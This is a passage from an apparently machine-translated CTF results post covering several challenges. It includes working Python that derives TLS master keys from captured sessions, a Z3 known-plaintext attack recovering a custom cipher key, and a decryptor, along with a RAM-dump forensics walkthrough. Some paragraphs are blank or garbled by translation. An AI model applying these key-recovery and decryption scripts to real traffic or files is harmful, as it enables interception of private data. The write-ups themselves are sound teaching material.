href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูุงููุตู</a> ูููุนูุง ูู RFC: <br><img src="https://habrastorage.org/webt/hl/ko/q6/hlkoq67uttadwf0spe68fvvgtgo.png"></p><br><p style=";text-align:right;direction:rtl">  ูุชูุฌุฉ ูุฐูู ุ ุจุนุฏ ูุตู ููู ุชูููุช ูู ุชุฑุงูุจ ูุฐุง (ุจุงููุณุจุฉ ูู ุ ูู ุฃุณุชุทุน ุงูุงุณุชุบูุงุก ุนู ุงูุฏุฑุงุฌุงุช): </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">for i in xrange(0, 4264): dh_secret = pow(srv_pubkeys[i], state, dh_p) dh_secret = hex(dh_secret)[2:-1] if len(dh_secret) % 2 : dh_secret = "0"+dh_secret while dh_secret[0:2] == "00": dh_secret = dh_secret[2:] dh_secret = dh_secret.decode("hex") seed = "master secret"+(cl_random[i].strip() + srv_random[i].strip()).decode("hex") A = seed master_key = "" for j in xrange(0, 2): A = hmac.new(dh_secret, A, hashlib.sha256).digest() master_key += hmac.new(dh_secret, A+seed, hashlib.sha256).digest() master_key = master_key[0:48].encode("hex") print "CLIENT_RANDOM " + cl_random[i].strip() + " " + master_key state *= 2 if state &gt; CMP: state ^= XOR</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุฏ) ูุชูุฒูู ูุฎุชูู ุนููู ุนุดูุงุฆู ุ ... ูู ุฌูุณุงุช Wireshark ุ ุชู ุงุณุชุฎุฏุงู ุงูุชุตุฏูุฑ ุฅูู CSV ูุงูุจุญุซ ูู ุญุฑูุฉ ุงููุฑูุฑ ุงูุฎุงู ุนู ูุง ุญุตู ูู CSV ุจุงุณู "...". </p><br><p style=";text-align:right;direction:rtl">  E) ููู ุชุดููุฑ 4264 ุฌูุณุฉ ุ ูุฑุฑ WireShark ุชูุงูู ุงููุซูุฑ ูู ุบูุบุงุจุงูุช ูู ุงูููุทูู (8 ูู ููู ูุงููุงู ุจุงููุณุจุฉ ูู) ุ ูููู ูุง ุดูุก ุ ููููู ุชุดุบูู ูู ุดูุก ุนูู ุฌูุงุฒ ููุจููุชุฑ ููู ุ ูููุณ ุนูู ููุจููุชุฑ ูุญููู ุถุนูู.  ููุน ุฐูู ุ ุนูุฏ ุชุตุฏูุฑ ูุงุฆูุงุช http (ูุทุน ูุดูุฑุฉ ูู ุตูุฑุฉ) ุ ูููู ูู WireShark ุญูุธ ูููุงุช 1000 ุงูุฃููู ููุท ุ ุซู ููุชูู ุชุฑููููุง.  ูุชูุฌุฉ ูุฐูู ุ ุงุถุทุฑุฑุช ุฅูู ุชูุณูู pcap ุฅูู 5 ุฃุฌุฒุงุก ูู 1000 ุฌูุณุฉ tcp ูู ูู ูููุง.  ููุงูุช ุงููุชูุฌุฉ ูุฐู ุตูุฑุฉ ุฌูููุฉ ุจุนุฏ ูุตู ุฌููุน ุงููุทุน: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/kn/op/xh/knopxh0nebqck4xuix2kvgmoyju.png"></p></div></div><br><p style=";text-align:right;direction:rtl">  ูููู ุงูุนุซูุฑ ุนูู ุฌููุน ุงููููุงุช ุงูุชู ูุณุชุฎุฏููุง ุงููุงุฆุฒ ูุญู ุงููููุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ููุง</a> . </p><br><h2 style=";text-align:right;direction:rtl">  ุงูููู 5. ุดู ุงููุญููุฉ </h2><br><div class="scrollable-table" style=";text-align:right;direction:rtl"><table style=";text-align:right;direction:rtl"><tbody><tr><td colspan="3" align="center">  ุงููุงุฆุฒูู </td></tr><tr><td align="center">  <b>1st ููุงู</b> </td><td align="center">  <b>ุงููุฑูุฒ ุงูุซุงูู</b> </td><td align="center">  <b>ุงููุฑูุฒ ุงูุซุงูุซ</b> </td></tr><tr><td align="center">  ููุณ </td><td align="center">  Bartimaeous </td><td align="center">  CLO </td></tr><tr><td colspan="3" align="center">  ูุฑุฑ ุฃูุถูุง: ููุณูู ุจุฑูููู ุ 0x3c3e ุ tinkerlock ุ demidov_al ุ x @ secator ุ groke_in_the_sky ุ d3fl4t3 </td></tr></tbody></table></div><br><p style=";text-align:right;direction:rtl">  ุงููููุฉ ูู ุฅุนุฏุงุฏ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">RuCTFE</a> .  ุชู ุฅุนุทุงุก ุงููุดุงุฑููู ููููุง ุชูููุฐููุง ุบุงูุถูุง ูุฒูุฏูุง ุจุนุฏุฏ ูู ุฃุณุงููุจ ููุงูุญุฉ ุงูุชุตุญูุญ.  ูุดุจู ุงูููู ุงููุงุจู ููุชูููุฐ ุนููู SSH ุงููุชุตู ุจุฎุงุฏู ูุนุฑูู ูุณุจููุง.  ุงููููุฉ ูู ููู ุฎูุงุฑุฒููุฉ ูุฐุง ุงูููู ููุญุตูู ุนูู ุชูููุฐ ุงูุฃูุงูุฑ ุนูู ุงูุฎุงุฏู.  ุชุถูู ุญู ุงููุคูู ุชุฌุงูุฒ ููุงูุญุฉ ุงูุชุดููุด ูุชุญููู ุงูุชุดููุด. </p><br><p style=";text-align:right;direction:rtl">  ุชุฌุฏุฑ ุงูุฅุดุงุฑุฉ ุฅูู ุฃู ุฃุณุฑุน ุงููุดุงุฑููู ูุงู ุจุญู ุงููููุฉ ุจุทุฑููุฉ ุฃุตููุฉ ูุฎุชููุฉ ุนู ุชูู ุงูุชู ุฎุทุท ููุง ุงููุคูู ุ ูุจุนุฏ ุฐูู ูุฌุฏ ุญูุงู ุขุฎุฑ.  ููููู ุฃู ุชุฑู ููู ูุนู ุฐูู ุชุญุช ุงูููุณุฏ ุฃุฏูุงู. </p><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ุฎูุงุฑุงุช ุญููู ููุงู ุงูููู ุงูุฎุงูุณ (vos)</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><iframe width="560" height="315" src="https://www.youtube.com/embed/rpq5R9wnoiM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/00xBulNZkGI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></div></div><br><h2 style=";text-align:right;direction:rtl">  ููู 6. ูุชุญ </h2><br><div class="scrollable-table" style=";text-align:right;direction:rtl"><table style=";text-align:right;direction:rtl"><tbody><tr><td colspan="3" align="center">  ุงููุงุฆุฒูู </td></tr><tr><td align="center">  <b>1st ููุงู</b> </td><td align="center">  <b>ุงููุฑูุฒ ุงูุซุงูู</b> </td><td align="center">  <b>ุงููุฑูุฒ ุงูุซุงูุซ</b> </td></tr><tr><td align="center">  gotdaswag </td><td align="center">  medidrdrider </td><td align="center">  sysenter </td></tr></tbody></table></div><br><p style=";text-align:right;direction:rtl">  ุชู ุฅุนุฏุงุฏ ูููุฉ ุงูููู ุงูุณุงุฏุณ ูู ูุจู ูุฑูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">VolgaCTF</a> .  ุฅุนุทุงุก ููู ูุงุจู ููุชูููุฐ ูููู ุจุชูููุฐ ุฎูุงุฑุฒููุฉ ุชุดููุฑ ูุฎุตุตุฉ.  ูุชุชูุซู ุงููููุฉ ูู ูู ุชุดููุฑ ุงูููู ุงููุญุฏุฏ ูู ุงูุดุฑุท ุ ูุดูุฑูุง ุจุงุณุชุฎุฏุงู ูุฐู ุงูุฎูุงุฑุฒููุฉ ุ ุฏูู ูุฌูุฏ ููุชุงุญ ูุนุฑูู. </p><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ุญู ูููุฉ ุงูููู ุงูุณุงุฏุณ (gotdaswag)</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><h3 id="intro" style=";text-align:right;direction:rtl">  INTRO </h3><br><p style=";text-align:right;direction:rtl">  ุฅุนุทุงุก ุฃุฑุดูู ูุน ููููู ุ <strong>ุฎุฒุงูุฉ</strong> ู <strong>secret.png.enc</strong> . </p><br><p style=";text-align:right;direction:rtl">  ุงูููู ุงูุฃูู ูู <strong>ELF</strong> ููุธุงู ุงูุชุดุบูู Linux x86-64 ุ ูุงูุฐู ูุณุชูุจู ููููุง ูููุชุงุญ ุชุดููุฑ ููุฏุฎูุงุช ุ ูุงูุซุงูู ูู ุตูุฑุฉ <strong>PNG</strong> ูุดูุฑุฉ. </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs"># ./locker Required option 'input' missing Usage: ./locker [options] Options: -i, --input in.png Input file path -o, --output out.png.enc Output file path -k, --key 0004081516234200 Encryption key in hex -h, --help Print this help menu</code> </pre> <br><h3 id="locker" style=";text-align:right;direction:rtl">  LOCKER </h3><br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุชุญููู ุงูููู ูู ุงููุคุณุณุฉ ุงูุฏูููุฉ ููุชูููุฉ ุ ูุฌุฏ ุฎูุงุฑุฒููุฉ ุงูุชุดููุฑ ูู <strong>ุงููุดุฑูุน ::</strong> ุงููุธููุฉ <strong>ุงูุฑุฆูุณูุฉ</strong> . </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/getpro/habr/post_images/0a3/e68/c77/0a3e68c773b0ff4a7c4d09a321deecd1.png"></p><br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุฏุฑุงุณุชู ุ ูููู ุฃู ูุฐุง ุนุจุงุฑุฉ ุนู <strong>ุชุดููุฑ ุจููู</strong> (ECB) ุ ุจุญุฌู ูุชูุฉ <strong>32 ุจุช</strong> ุ ูุญุฌู ุฑุฆูุณู ูุจูุบ <strong>64 ุจุช</strong> ูุนุฏุฏ ุฌููุงุช <strong>77</strong> . </p><br><h5 id="versiya-na-python" style=";text-align:right;direction:rtl">  ูุณุฎุฉ ุจูุซูู </h5><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">encrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(p, k, rounds=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">77</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, rounds): n = (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">1</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">26</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xE0</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">22</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0x10</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">13</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">8</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">4</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">2</span></span> x = p ^ k x ^= p &gt;&gt; <span class="hljs-number"><span class="hljs-number">12</span></span> x ^= p &gt;&gt; <span class="hljs-number"><span class="hljs-number">20</span></span> x &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> y = <span class="hljs-number"><span class="hljs-number">1</span></span> &lt;&lt; n y &amp;= <span class="hljs-number"><span class="hljs-number">0xBB880F0FC30F0000</span></span> y &gt;&gt;= n y &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> x == y: p &amp;= <span class="hljs-number"><span class="hljs-number">0xFFFFFFFE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: p |= <span class="hljs-number"><span class="hljs-number">1</span></span> k = ror(k, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) p = ror(p, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> p</code> </pre> <br><h3 id="secret-key" style=";text-align:right;direction:rtl">  ุณุฑ ููุชุงุญ </h3><br><p style=";text-align:right;direction:rtl">  ูุญู ูุนูู ุฃู ุงูููู ุงููุดูุฑ ูู ุตูุฑุฉ <strong>PNG</strong> . <br>  ููููุง ูุฐูู ุ ูุญู ูุนุฑู <strong>ุจุถุนุฉ ูุต ูุดูุฑ</strong> ูู ุดูู ุฑุฃุณ ููู (ููู ุฃูุฑ ููุงุณู ุจุงููุณุจุฉ ูู PNG). <br><img src="https://habrastorage.org/getpro/habr/post_images/0b7/ecb/770/0b7ecb770732ca1fdc9f8cba8f0d8248.png"></p><br><p style=";text-align:right;direction:rtl">  ููุฌุฑุจ ุงูุทุฑููุฉ ุงูุจุณูุทุฉ ูุงุณุชุฎุฏุงู <strong>SMT solver</strong> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" title="Z3">Z3</a> ) ููุนุซูุฑ ุนูู ููุชุงุญ ุงูุชุดููุฑ. <br>  ููููุงู ุจุฐูู ุ ูู ุจุชุนุฏูู ุงูุดูุฑุฉ ููููุงู ูุฃุฑุณู ุฅูู ุฒูุฌ ูู ุงููุต ุงููุดูุฑ. </p><br><h5 id="task6_keypy" style=";text-align:right;direction:rtl">  task6_key.py </h5><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> z3 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-comment"><span class="hljs-comment"># PNG file signature (8 bytes) + IHDR chunk header (8 bytes) PLAIN_TEXT = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52' BLOCK_SIZE = 4 def encrypt(p, k, rounds=77): for i in range(0, rounds): n = LShR(p, 4) &amp; 1 n |= LShR(p, 26) &amp; 0xE0 n |= LShR(p, 22) &amp; 0x10 n |= LShR(p, 13) &amp; 8 n |= LShR(p, 7) &amp; 4 n |= LShR(p, 4) &amp; 2 x = k ^ ZeroExt(32, p) x ^= LShR(ZeroExt(32, p), 12) x ^= LShR(ZeroExt(32, p), 20) x &amp;= 1 y = 1 &lt;&lt; ZeroExt(32, n) y &amp;= 0xBB880F0FC30F0000 y = LShR(y, ZeroExt(32, n)) y &amp;= 1 p = If(x == y, p &amp; 0xFFFFFFFE, p | 1) p = RotateRight(p, 1) k = RotateRight(k, 1) return p def qword_le_to_be(v): pv = struct.pack('&lt;Q', v) uv = struct.unpack('&gt;Q', pv) return uv[0] if len(sys.argv) &lt; 2: sys.exit('no input file specified') with open(sys.argv[1], 'rb') as encrypted_file: k = BitVec('k', 64) key = k solver = Solver() for i in range(0, len(PLAIN_TEXT), BLOCK_SIZE): # prepare plain text and cipher text pairs pt = struct.unpack('&lt;L', PLAIN_TEXT[i:i + BLOCK_SIZE])[0] ct = struct.unpack('&lt;L', encrypted_file.read(BLOCK_SIZE))[0] p = BitVecVal(pt, 32) e = BitVecVal(ct, 32) solver.add(encrypt(p, k) == e) print('solving ...') if solver.check() == sat: encryption_key = solver.model()[key].as_long() print('key: %016X' % qword_le_to_be(encryption_key))</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  ุงูุญู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">&gt; python task6_key.py "secret.png.enc" solving ... key: AE34C511A8238BCC</code> </pre> <br><h3 id="unlocker" style=";text-align:right;direction:rtl"> UNLOCKER </h3><br><p style=";text-align:right;direction:rtl">          . <br>                  . </p><br><h5 id="task6_unlockerpy" style=";text-align:right;direction:rtl"> task6_unlocker.py </h5><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> binascii BLOCK_SIZE = <span class="hljs-number"><span class="hljs-number">4</span></span> ror = <span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> val, r_bits, max_bits: \ ((val &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) &gt;&gt; r_bits%max_bits) | \ (val &lt;&lt; (max_bits-(r_bits%max_bits)) &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) rol = <span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> val, r_bits, max_bits: \ (val &lt;&lt; r_bits%max_bits) &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>) | \ ((val &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) &gt;&gt; (max_bits-(r_bits%max_bits))) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(e, k, rounds=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">77</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> dk = ror(k, <span class="hljs-number"><span class="hljs-number">13</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, rounds): dk = rol(dk, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) e = rol(e, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>) n = (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">1</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">26</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xE0</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">22</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0x10</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">13</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">8</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">4</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">2</span></span> x = e ^ dk x ^= e &gt;&gt; <span class="hljs-number"><span class="hljs-number">12</span></span> x ^= e &gt;&gt; <span class="hljs-number"><span class="hljs-number">20</span></span> x &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> y = <span class="hljs-number"><span class="hljs-number">1</span></span> &lt;&lt; n y &amp;= <span class="hljs-number"><span class="hljs-number">0xBB880F0FC30F0000</span></span> y &gt;&gt;= n y &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> x == y: e &amp;= <span class="hljs-number"><span class="hljs-number">0xFFFFFFFE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: e |= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">2</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no input file specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">3</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no output file specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">4</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no encryption key specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: key = binascii.unhexlify(sys.argv[<span class="hljs-number"><span class="hljs-number">3</span></span>]) key = struct.unpack(<span class="hljs-string"><span class="hljs-string">'&lt;Q'</span></span>, key)[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'non-hexadecimal encryption key'</span></span>) print(<span class="hljs-string"><span class="hljs-string">'unlocking ...'</span></span>) start_time = time.time() <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>], <span class="hljs-string"><span class="hljs-string">'rb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> ef: <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(sys.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>], <span class="hljs-string"><span class="hljs-string">'wb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> df: <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>: ct = ef.read(BLOCK_SIZE) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> ct: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> ct = struct.unpack(<span class="hljs-string"><span class="hljs-string">'&lt;L'</span></span>, ct)[<span class="hljs-number"><span class="hljs-number">0</span></span>] pt = decrypt(ct, key) pt = struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;L'</span></span>, pt) df.write(pt) print(<span class="hljs-string"><span class="hljs-string">'done, took %.3f seconds.'</span></span> % (time.time() - start_time))</code> </pre> <br><p style=";text-align:right;direction:rtl">  ,         . </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">&gt; python task6_unlocker.py "secret.png.enc" "secret.png" "AE34C511A8238BCC" unlocking ... done, took 49.669 seconds.</code> </pre> <br><h5 id="secretpng" style=";text-align:right;direction:rtl"> secret.png </h5><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/getpro/habr/post_images/9fa/18b/2b2/9fa18b2b2264379bd89ebcaaf62c3006.png"></p><br><blockquote style=";text-align:right;direction:rtl"> ZN{RA$T0GR@PHY_H3RTS} </blockquote></div></div><br><h2 style=";text-align:right;direction:rtl"> Day 7. Beep Beep! </h2><br><div class="scrollable-table" style=";text-align:right;direction:rtl"><table style=";text-align:right;direction:rtl"><tbody><tr><td align="center">  </td></tr><tr><td align="center"> <b>1 </b> </td></tr><tr><td align="center"> sysenter </td></tr></tbody></table></div><br><p style=";text-align:right;direction:rtl">     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">SchoolCTF</a> .     ,    ,  .   ,       ,      . </p><br><div class="spoiler" style=";text-align:right;direction:rtl"> <b class="spoiler_title">    (sysenter)</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><p style=";text-align:right;direction:rtl"> Something that looks like VirtualBox RAM dump is provided to us. </p><br><p style=";text-align:right;direction:rtl"> We can try volatility, but it seems that it unable to locate required structures to restore Virtual Memory layout. </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/go/1l/7i/go1l7imiojbikday6awhxdrbw58.png"></p><br><p style=";text-align:right;direction:rtl"> No process memory for us today, so we will have to work with fragmented memory. </p><br><p style=";text-align:right;direction:rtl"> First of all let's precache strings from the dump. </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">strings &gt; strings_ascii.txt strings -el &gt; strings_wide.txt</code> </pre> <br><p style=";text-align:right;direction:rtl"> Most interesting one is command execution log: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">cd .. .\injector.exe 192.168.1.65 .\run.exe .\storage cd .\server\ .\run.exe block1 .\run.exe block0 cd Z:\zn_2019\ cd .\server\ cd .. .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd .. touch echo echo qwe echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ injector.exe 1921.68.1.65 injector.exe 192.68.1.65 ./injector.exe 192.68.1.65 .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\server\ run storage .\run.exe .\storage cd Z:\zn_2019\server\ .\run.exe block1 cd Z:\zn_2019\server\ .\run.exe block0 cd .. .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\Injector2.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 .\injector2.exe 192.168.1.65 cd Z:\zn_2019\ .\Injector2.exe 192.168.1.65 '.\ConsoleApplication5 (2).exe' 192.168.1.65</code> </pre> <br><p style=";text-align:right;direction:rtl"> <strong>Not Important note:</strong> </p><br><p style=";text-align:right;direction:rtl"> <em>Not sure what <strong>SIGN.MEDIA</strong> is, but it looks like a cached file list from VirtualBox Network Share (Is this from Windows Registry?).</em> </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">SIGN.MEDIA=138A400 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=138A400 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=138A400 zn_2019\Injector2.exe SIGN.MEDIA=138A400 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=138A400 zn_2019\NOTE1.exe SIGN.MEDIA=138A400 zn_2019\NOTE1.exe SIGN.MEDIA=138A400 zn_2019\With_little_debug.exe SIGN.MEDIA=138A400 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=138A400 zn_2019\injector.exe SIGN.MEDIA=138A400 zn_2019\nnnn.exe SIGN.MEDIA=138A400 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=138A400 zn_2019\note.exe SIGN.MEDIA=138A400 zn_2019\note2.exe SIGN.MEDIA=138A400 zn_2019\note3.exe SIGN.MEDIA=138A400 zn_2019\note4.exe SIGN.MEDIA=138A400 zn_2019\random.exe SIGN.MEDIA=138A400 zn_2019\z.exe SIGN.MEDIA=17582C zn_2019\Injector2.exe SIGN.MEDIA=17582C zn_2019\injector.exe SIGN.MEDIA=196C2 zn_2019\server\run.exe SIGN.MEDIA=1C176B0 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C176B0 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C176B0 zn_2019\Injector2.exe SIGN.MEDIA=1C176B0 zn_2019\injector.exe SIGN.MEDIA=1C176B0 zn_2019\note.exe SIGN.MEDIA=1C176B0 zn_2019\note2.exe SIGN.MEDIA=1C176B0 zn_2019\note3.exe SIGN.MEDIA=1C1D02C zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C1D02C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C1D02C zn_2019\Injector2.exe SIGN.MEDIA=1C1D02C zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C1D02C zn_2019\With_little_debug.exe SIGN.MEDIA=1C1D02C zn_2019\injector.exe SIGN.MEDIA=1C1D02C zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C1D02C zn_2019\note.exe SIGN.MEDIA=1C1D02C zn_2019\note2.exe SIGN.MEDIA=1C1D02C zn_2019\note3.exe SIGN.MEDIA=1C1DAB0 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C1DAB0 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C1DAB0 zn_2019\Injector2.exe SIGN.MEDIA=1C1DAB0 zn_2019\With_little_debug.exe SIGN.MEDIA=1C1DAB0 zn_2019\injector.exe SIGN.MEDIA=1C1DAB0 zn_2019\note.exe SIGN.MEDIA=1C1DAB0 zn_2019\note2.exe 